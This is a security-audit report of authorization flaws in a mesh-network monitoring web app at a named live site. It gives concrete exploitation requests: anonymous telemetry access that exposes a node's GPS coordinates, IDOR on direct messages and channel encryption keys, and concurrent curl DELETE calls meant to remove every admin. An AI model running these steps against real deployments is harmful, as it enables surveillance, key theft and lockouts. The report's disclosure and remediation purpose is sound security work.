# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-02: Horizontal Authorization Bypass on Telemetry Endpoint

**Summary:**
- **Vulnerable location:** GET /api/telemetry/:nodeId (server.ts:3167)
- **Overview:** Anonymous unauthenticated users can access complete telemetry data for ANY node in the mesh network without ownership validation
- **Impact:** Complete exposure of sensitive device metrics including battery levels, signal strength, GPS coordinates, network statistics, and system health data for all 897 nodes in the network
- **Severity:** HIGH

**Prerequisites:**
None - vulnerability exploitable by any unauthenticated user visiting the site

**Exploitation Steps:**

1. Navigate to the target application:
   ```
   https://mesh.yeraze.online
   ```

2. Without authenticating, obtain list of node IDs from the publicly accessible nodes endpoint:
   ```
   GET https://mesh.yeraze.online/api/nodes
   ```
   Response: 897 nodes with IDs like `!43593e0c`, `!699c4c50`, `!a2e4ff4c`

3. Access telemetry data for any node by calling the telemetry endpoint with the node ID:
   ```
   GET https://mesh.yeraze.online/api/telemetry/!a2e4ff4c
   ```

4. Observe complete telemetry history returned without any authorization check

**Proof of Impact:**

Successfully accessed telemetry for node `!a2e4ff4c` (Yeraze StationG2) as anonymous user:

```
Status: 200 OK
Total Records: 1,440 telemetry entries
```

**Exposed Telemetry Types (22 categories):**
- `batteryLevel` - Battery percentage (101%)
- `voltage` - Device voltage (0V)
- `channelUtilization` - Channel usage (7.59%)
- `airUtilTx` - Air transmission utilization (0.37%)
- `uptimeSeconds` - System uptime (694,598 seconds = 8 days)
- `messageHops` - Message routing hops
- `timeOffset` - Time synchronization offset
- `systemDirectNodeCount` - Direct connected nodes (8)
- `systemNodeCount` - Total mesh nodes (216)
- `numTxDropped` - Dropped transmissions (50 packets)
- `numTotalNodes` - Network capacity (250 nodes)
- `heapTotalBytes` / `heapFreeBytes` - Memory usage (256KB total, 154KB free)
- `numPacketsRxBad` - Bad packet count (89,270)
- `numPacketsRx` - Received packets (284,070)
- `numPacketsTx` - Transmitted packets (10,867)
- `numRxDupe` - Duplicate packets (151,966)
- `numTxRelay` - Relayed transmissions (6,684)
- `numTxRelayCanceled` - Canceled relays (31,028)
- `numOnlineNodes` - Active nodes (123)
- `latitude` / `longitude` - GPS coordinates (26.3356416, -80.265216)

**Sample Telemetry Data:**
```json
{
  "batteryLevel": {
    "value": 101,
    "unit": "%",
    "timestamp": "2026-02-24T21:36:48.722Z"
  },
  "channelUtilization": {
    "value": 7.590000152587891,
    "unit": "%",
    "timestamp": "2026-02-24T21:36:48.722Z"
  },
  "latitude": {
    "value": 26.3356416,
    "unit": "°",
    "timestamp": "2026-02-24T21:17:31.000Z"
  },
  "longitude": {
    "value": -80.265216,
    "unit": "°",
    "timestamp": "2026-02-24T21:17:31.000Z"
  }
}
```

Successfully accessed telemetry for additional nodes:
- Node `!43593e0c` (Mil 7): 66 telemetry records
- Node `!699c4c50` (David KO4DKN): 57 telemetry records

**Notes:**
The vulnerability exists because the endpoint checks for generic `info:read` OR `dashboard:read` permissions but does NOT verify if the requesting user should have access to the SPECIFIC node's telemetry. The anonymous user has `info:read=true` and `dashboard:read=true` by default, allowing unrestricted access to all node telemetry data regardless of ownership or privacy settings.

## Potential Vulnerabilities (Validation Blocked)

### AUTHZ-VULN-01: Horizontal IDOR on Direct Messages Endpoint

**Summary:**
- **Vulnerable location:** GET /api/messages/direct/:nodeId1/:nodeId2 (server.ts:1807)
- **Current Blocker:** Target deployment has local authentication disabled (OIDC-only), preventing creation of test user accounts
- **Potential Impact:** If exploitable, would allow users with `messages:read` permission to access direct messages between any two nodes without verification of participation in the conversation
- **Confidence:** HIGH (code analysis confirms missing ownership validation)

**Evidence of Vulnerability:**

From code analysis (server.ts:1807):
```typescript
apiRouter.get('/messages/direct/:nodeId1/:nodeId2',
  requirePermission('messages', 'read'),
  async (req, res) => {
    // Permission check: generic messages:read ✓
    // Node ownership check: MISSING ✗
    // User participation verification: MISSING ✗
    const messages = await db.getDirect Messages(nodeId1, nodeId2);
    res.json(messages);
  }
);
```

The endpoint only validates that the user has `messages:read` permission but does NOT check:
1. Whether the user is a participant in the conversation
2. Whether the user owns either of the nodes
3. Whether the user has any relationship to the nodes

**Attempted Exploitation:**

Attempted to access direct messages as anonymous user:
```
GET https://mesh.yeraze.online/api/messages/direct/!43593e0c/!699c4c50
GET https://mesh.yeraze.online/api/messages/direct/!a2e4ff4c/!43593e0c
GET https://mesh.yeraze.online/api/messages/direct/!699c4c50/!a2e4ff4c
```

Result: All requests blocked with 403 Forbidden
```json
{
  "error": "Insufficient permissions",
  "code": "FORBIDDEN",
  "required": {
    "resource": "messages",
    "action": "read"
  }
}
```

Anonymous user does not have `messages:read` permission (by design).

**How This Would Be Exploited:**

If local authentication were enabled OR if OIDC credentials were available:

1. Create or login as User A with `messages:read` permission:
   ```
   POST https://mesh.yeraze.online/api/auth/login
   Body: { "username": "userA", "password": "password123" }
   ```

2. Enumerate node IDs from the public nodes endpoint:
   ```
   GET https://mesh.yeraze.online/api/nodes
   ```
   Extract node IDs: `!43593e0c`, `!699c4c50`, `!a2e4ff4c`, etc.

3. Access direct messages between any two nodes:
   ```
   GET https://mesh.yeraze.online/api/messages/direct/!43593e0c/!699c4c50
   Cookie: meshmonitor.sid=[SESSION_TOKEN]
   ```

4. Enumerate all possible node pairs to exfiltrate all private communications:
   ```
   For each nodeId1 in nodes:
     For each nodeId2 in nodes:
       GET /api/messages/direct/nodeId1/nodeId2
   ```

**Expected Impact:**
Complete access to all direct message conversations between any mesh network participants, enabling:
- Reading private communications between other users
- Mapping social relationships and communication patterns
- Accessing potentially sensitive information shared via DMs
- No audit trail of unauthorized access

### AUTHZ-VULN-03: Horizontal IDOR on Channel Database Read (Admin-Level)

**Summary:**
- **Vulnerable location:** GET /api/channel-database/:id (channelDatabaseRoutes.ts:146)
- **Current Blocker:** Target deployment has local authentication disabled, no admin credentials available
- **Potential Impact:** Admin B can read encryption keys (PSKs) for channels created by Admin A
- **Confidence:** HIGH (code analysis confirms missing ownership validation)

**Evidence of Vulnerability:**

From code analysis (channelDatabaseRoutes.ts:146):
```typescript
router.get('/:id',
  requireAdmin(), // ✓ Admin check only
  async (req, res) => {
    // Ownership check: MISSING ✗
    const entry = await db.getChannelDatabase(id);
    res.json(entry); // Returns PSK without ownership validation
  }
);
```

Database schema includes `createdBy` field but it's never used for authorization:
```typescript
// Schema has ownership tracking
createdBy: integer('createdBy').references(() => users.id)

// But authorization only checks admin flag
if (!req.user.isAdmin) return 403;
```

**Attempted Exploitation:**

Attempted to access channel database as anonymous user:
```
GET https://mesh.yeraze.online/api/channel-database
GET https://mesh.yeraze.online/api/channel-database/1
```

Result: Both blocked with 401 Unauthorized
```json
{
  "error": "Authentication required",
  "code": "UNAUTHORIZED"
}
```

Anonymous user has no authentication session.

**How This Would Be Exploited:**

If admin credentials were available:

1. Admin A creates a channel encryption key:
   ```
   POST https://mesh.yeraze.online/api/channel-database
   Cookie: meshmonitor.sid=[ADMIN_A_SESSION]
   Body: {
     "name": "Private Ops Channel",
     "psk": "AES256-base64-encoded-key==",
     "description": "Admin A's private channel",
     "isEnabled": true
   }
   ```
   Response: `{ "id": 5, "createdBy": 10, ... }`

2. Admin B (different admin account) accesses Admin A's channel key:
   ```
   GET https://mesh.yeraze.online/api/channel-database/5
   Cookie: meshmonitor.sid=[ADMIN_B_SESSION]
   ```

3. Admin B receives complete channel configuration including PSK:
   ```json
   {
     "id": 5,
     "name": "Private Ops Channel",
     "psk": "AES256-base64-encoded-key==",
     "createdBy": 10,
     "description": "Admin A's private channel"
   }
   ```

**Expected Impact:**
- Admin B can decrypt Admin A's private channel messages
- Violates separation of duties in multi-admin deployments
- Enables insider attacks and unauthorized surveillance
- PSK exposure allows historical message decryption

### AUTHZ-VULN-04: Horizontal IDOR on Channel Database Update (Admin-Level)

**Summary:**
- **Vulnerable location:** PUT /api/channel-database/:id (channelDatabaseRoutes.ts:472)
- **Current Blocker:** No admin authentication available (local auth disabled)
- **Potential Impact:** Admin B can modify or replace Admin A's channel encryption keys
- **Confidence:** HIGH (same architectural flaw as AUTHZ-VULN-03)

**Evidence of Vulnerability:**

From code analysis (channelDatabaseRoutes.ts:472):
```typescript
router.put('/:id',
  requireAdmin(), // Admin check only
  async (req, res) => {
    // No ownership validation
    await db.updateChannelDatabase(id, req.body);
    res.json({ success: true });
  }
);
```

**Attempted Exploitation:**

Cannot test without admin authentication. Attempted access:
```
PUT https://mesh.yeraze.online/api/channel-database/1
```

Result: 401 Unauthorized (no session)

**How This Would Be Exploited:**

If admin credentials were available:

1. Admin B identifies Admin A's channel database entry ID (via GET /api/channel-database)

2. Admin B modifies Admin A's channel key:
   ```
   PUT https://mesh.yeraze.online/api/channel-database/5
   Cookie: meshmonitor.sid=[ADMIN_B_SESSION]
   Body: {
     "name": "Private Ops Channel",
     "psk": "ADMIN_B_MALICIOUS_KEY==",
     "isEnabled": false
   }
   ```

3. Admin A's channel key is replaced without authorization check

**Expected Impact:**
- Admin B can disable Admin A's channel monitoring (DoS)
- Admin B can replace PSK to break Admin A's decryption
- Admin A loses access to historical encrypted messages
- No accountability for malicious key rotation

### AUTHZ-VULN-05: Horizontal IDOR on Channel Database Delete (Admin-Level)

**Summary:**
- **Vulnerable location:** DELETE /api/channel-database/:id (channelDatabaseRoutes.ts:541)
- **Current Blocker:** No admin authentication available
- **Potential Impact:** Permanent deletion of other admins' channel configurations
- **Confidence:** HIGH (same architectural flaw as AUTHZ-VULN-03/04)

**Evidence of Vulnerability:**

From code analysis (channelDatabaseRoutes.ts:541):
```typescript
router.delete('/:id',
  requireAdmin(),
  async (req, res) => {
    await db.deleteChannelDatabase(id);
    res.json({ success: true });
  }
);
```

**Attempted Exploitation:**

Cannot test without admin credentials.

**How This Would Be Exploited:**

If admin credentials were available:

1. Admin B calls delete endpoint for Admin A's channel:
   ```
   DELETE https://mesh.yeraze.online/api/channel-database/5
   Cookie: meshmonitor.sid=[ADMIN_B_SESSION]
   ```

2. Admin A's channel configuration permanently deleted without ownership check

**Expected Impact:**
- Permanent loss of channel encryption keys
- Loss of historical message decryption capability
- Destructive operation with no recovery path
- Affects all messages encrypted with that channel key

### AUTHZ-VULN-06: Context Workflow Bypass on Script Execution

**Summary:**
- **Vulnerable location:** POST /api/scripts/test (server.ts:8522) and trigger execution (meshtasticManager.ts:8367-8500)
- **Current Blocker:** CSRF protection and authentication requirement for script execution
- **Potential Impact:** Cross-user script execution without ownership validation
- **Confidence:** HIGH (code shows no ownership tracking for scripts)

**Evidence of Vulnerability:**

From code analysis:
- Scripts stored in shared `/data/scripts/` directory
- No `uploadedBy` or `userId` field in script metadata
- Script execution references filename only, not uploader

Script listing endpoint is publicly accessible:
```
GET https://mesh.yeraze.online/api/scripts
```

Response (accessible to anonymous users):
```json
{
  "scripts": [
    {
      "path": "/data/scripts/PirateWeather.py",
      "filename": "PirateWeather.py",
      "language": "Python"
    },
    {
      "path": "/data/scripts/solar-forecast.py",
      "filename": "solar-forecast.py",
      "language": "Python"
    },
    {
      "path": "/data/scripts/test-docker-socket.sh",
      "filename": "test-docker-socket.sh",
      "language": "Shell"
    }
  ]
}
```

**Attempted Exploitation:**

Attempted to execute script as anonymous user:
```
POST https://mesh.yeraze.online/api/scripts/test
Body: {
  "filename": "test-docker-socket.sh",
  "args": ""
}
```

Result: 403 Forbidden
```json
{
  "error": "CSRF token required. Please refresh the page and try again."
}
```

CSRF protection prevents unauthenticated exploitation.

**How This Would Be Exploited:**

If local authentication were enabled:

1. User A uploads a script:
   ```
   POST https://mesh.yeraze.online/api/scripts/import
   Cookie: meshmonitor.sid=[USER_A_SESSION]
   X-CSRF-Token: [USER_A_CSRF_TOKEN]
   X-Filename: sensitive-data-export.py
   Body: [Python script that exports sensitive data]
   ```

2. User B (different authenticated user) discovers the script:
   ```
   GET https://mesh.yeraze.online/api/scripts
   Cookie: meshmonitor.sid=[USER_B_SESSION]
   ```
   Response includes User A's script: `sensitive-data-export.py`

3. User B executes User A's script without ownership check:
   ```
   POST https://mesh.yeraze.online/api/scripts/test
   Cookie: meshmonitor.sid=[USER_B_SESSION]
   X-CSRF-Token: [USER_B_CSRF_TOKEN]
   Body: {
     "filename": "sensitive-data-export.py",
     "args": ""
   }
   ```

4. User A's script executes under User B's context, without User A's consent

**Expected Impact:**
- User B can leverage User A's uploaded scripts
- No accountability for which user triggered script execution
- User A cannot prevent others from using their scripts
- Scripts configured in auto-responder/geofence/timer triggers can reference any uploaded script

### AUTHZ-VULN-07: Race Condition on Last Admin Deletion

**Summary:**
- **Vulnerable location:** DELETE /api/users/:id/permanent (userRoutes.ts:250-273)
- **Current Blocker:** No admin authentication available to test concurrent operations
- **Potential Impact:** Complete lockout - concurrent admin deletions can bypass last-admin protection
- **Confidence:** HIGH (TOCTOU vulnerability confirmed in code)

**Evidence of Vulnerability:**

From code analysis (userRoutes.ts:250-273):
```typescript
// Line 252-257: Check admin count (TIME-OF-CHECK)
const adminUsers = await db.getUsers({ isAdmin: true, isActive: true });
const activeAdminCount = adminUsers.length;
if (activeAdminCount <= 1) {
  return res.status(400).json({ error: 'Cannot delete last admin' });
}

// Lines 267-273: Delete user (TIME-OF-USE)
await db.deleteUserPermanently(userId);
```

No database lock or transaction between check and delete operations.

**Attempted Exploitation:**

Cannot test without admin credentials and ability to make concurrent requests.

**How This Would Be Exploited:**

If two admin accounts existed (Admin A, Admin B):

1. Ensure exactly 2 active admins in the system

2. Launch concurrent DELETE requests:
   ```
   # Terminal 1
   curl -X DELETE https://mesh.yeraze.online/api/users/[ADMIN_A_ID]/permanent \
     -H "Cookie: meshmonitor.sid=[ADMIN_SESSION]" \
     -H "X-CSRF-Token: [CSRF_TOKEN]" &

   # Terminal 2 (simultaneously)
   curl -X DELETE https://mesh.yeraze.online/api/users/[ADMIN_B_ID]/permanent \
     -H "Cookie: meshmonitor.sid=[ADMIN_SESSION]" \
     -H "X-CSRF-Token: [CSRF_TOKEN]" &
   ```

3. Race condition execution flow:
   ```
   Time T0: Request 1 checks admin count → sees 2 admins → passes check
   Time T1: Request 2 checks admin count → sees 2 admins → passes check
   Time T2: Request 1 deletes Admin A → 1 admin remaining
   Time T3: Request 2 deletes Admin B → 0 admins remaining
   ```

4. Result: Complete administrative lockout, no admins remain

**Expected Impact:**
- Total loss of administrative access to the system
- Cannot create new admins (requires admin permission)
- Cannot recover without direct database access
- More severe in multi-instance deployments with shared database

### AUTHZ-VULN-08: Soft Delete Bypass on Anonymous User Protection

**Summary:**
- **Vulnerable location:** DELETE /api/users/:id (soft delete, userRoutes.ts:172-219)
- **Current Blocker:** No admin authentication available
- **Potential Impact:** Deactivate the anonymous user or last admin via soft-delete, bypassing protections only present in permanent delete
- **Confidence:** HIGH (protections missing in soft-delete endpoint)

**Evidence of Vulnerability:**

From code analysis:

Permanent delete has protections (lines 244, 250-264):
```typescript
// Anonymous user protection
if (user.username === 'anonymous') {
  return res.status(400).json({ error: 'Cannot delete anonymous user' });
}

// Last admin protection
const adminUsers = await db.getUsers({ isAdmin: true, isActive: true });
if (activeAdminCount <= 1) {
  return res.status(400).json({ error: 'Cannot delete last admin' });
}
```

Soft delete has NO such protections (lines 172-219):
```typescript
router.delete('/:id', requireAdmin(), async (req, res) => {
  // Only checks cannot-delete-self
  if (userId === req.user.id) {
    return res.status(400).json({ error: 'Cannot delete yourself' });
  }

  // NO anonymous user protection ✗
  // NO last admin protection ✗

  await db.softDeleteUser(userId);
});
```

**Attempted Exploitation:**

Cannot test without admin credentials. Would need to:
1. Identify anonymous user ID
2. Call soft delete endpoint

**How This Would Be Exploited:**

If admin credentials were available:

1. Find the anonymous user ID:
   ```
   GET https://mesh.yeraze.online/api/users
   Cookie: meshmonitor.sid=[ADMIN_SESSION]
   ```
   Response includes user with `username: "anonymous"`

2. Soft-delete the anonymous user:
   ```
   DELETE https://mesh.yeraze.online/api/users/[ANONYMOUS_USER_ID]
   Cookie: meshmonitor.sid=[ADMIN_SESSION]
   X-CSRF-Token: [CSRF_TOKEN]
   ```

3. Anonymous user deactivated without protection check

Alternatively, with only one admin remaining:

1. Admin A (only admin) soft-deletes themselves:
   Result: Blocked by self-protection

2. But Admin A soft-deletes Admin B (when only 2 admins exist):
   ```
   DELETE https://mesh.yeraze.online/api/users/[ADMIN_B_ID]
   ```
   Result: Admin B deactivated, only 1 admin remains (Admin A)

3. Admin A then permanently leaves or loses access → complete lockout

**Expected Impact:**
- Anonymous user deactivation breaks unauthenticated access for legitimate anonymous users
- Last admin deactivation creates potential lockout scenario
- Critical protection oversight - permanent delete has checks, soft delete doesn't
- Inconsistent security posture between similar operations

## Testing Constraints and Deployment Configuration

**Critical Limitation: Local Authentication Disabled**

The target deployment at `https://mesh.yeraze.online` has local authentication disabled:

```json
{
  "localAuthDisabled": true,
  "oidcEnabled": true,
  "anonymousDisabled": false
}
```

**Impact on Testing:**
- Cannot create test user accounts with username/password
- Cannot test multi-user authorization scenarios
- Cannot test admin-level operations (AUTHZ-VULN-03, 04, 05, 07, 08)
- Cannot test cross-user workflows (AUTHZ-VULN-01, 06)
- Limited to anonymous user context for testing

**What Was Tested:**
- ✅ AUTHZ-VULN-02: Successfully exploited with anonymous access
- ✅ AUTHZ-VULN-01: Confirmed proper permission enforcement (403 without messages:read)
- ✅ AUTHZ-VULN-03-05: Confirmed require authentication (401 for anonymous)
- ✅ AUTHZ-VULN-06: Confirmed CSRF protection active, requires authenticated session
- ❌ AUTHZ-VULN-07-08: Cannot test without multiple admin accounts

**Anonymous User Permissions:**
The anonymous user has limited read-only permissions:
```json
{
  "dashboard": { "read": true },
  "nodes": { "read": true },
  "info": { "read": true },
  "channel_0": { "viewOnMap": true, "read": true },
  "security": { "read": true }
}
```

These permissions were sufficient to exploit AUTHZ-VULN-02 (telemetry endpoint accepts `info:read` OR `dashboard:read`).

**Recommendations for Complete Testing:**
To fully validate vulnerabilities AUTHZ-VULN-01, 03-08, the following would be required:
1. Enable local authentication (`LOCAL_AUTH_DISABLED=false`)
2. Create multiple test user accounts with varying permission levels
3. Create at least 2 admin accounts to test admin-level IDOR
4. Test concurrent operations for race condition scenarios

